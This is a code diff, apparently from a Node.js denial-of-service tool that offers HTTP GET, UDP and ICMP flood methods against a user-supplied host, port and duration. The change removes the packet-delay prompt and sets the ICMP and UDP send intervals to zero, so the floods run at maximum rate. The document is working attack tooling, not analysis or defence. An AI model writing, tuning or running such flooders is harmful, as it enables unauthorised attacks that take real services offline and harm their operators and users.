@@ -48,7 +48,7 @@ readline.question('Layer7: GET \nLayer4: CNC, UDP \nLayer3: ICMP \nEnter method:
                                 }
                             });
                         }
-                    }, 1000)
+                    }, 0)
                     setTimeout(() => {
                         clearInterval(icmp_sender)
                     }, time * 1000)
@@ -59,7 +59,7 @@ readline.question('Layer7: GET \nLayer4: CNC, UDP \nLayer3: ICMP \nEnter method:
         readline.question('Host: ', (host) => {
             readline.question('Port: ', (port) => {
                 readline.question('Packet Size (MB): ', (size) => {
-                    readline.question('Packet Delay (MS): ', (delay) => {
+
                     readline.question('Time: ', (time) => {
                         const udp_sender = setInterval(() => {
                             const x = dgram.createSocket('udp4');
@@ -70,13 +70,13 @@ readline.question('Layer7: GET \nLayer4: CNC, UDP \nLayer3: ICMP \nEnter method:
                                 }
                                 x.close();
                             });
-                        }, delay)
+                        }, 0)
                         setTimeout(() => {
                             clearInterval(udp_sender)
                         }, time * 1000)
                     });
                 });
-            });
+
         });
     });
     } else {
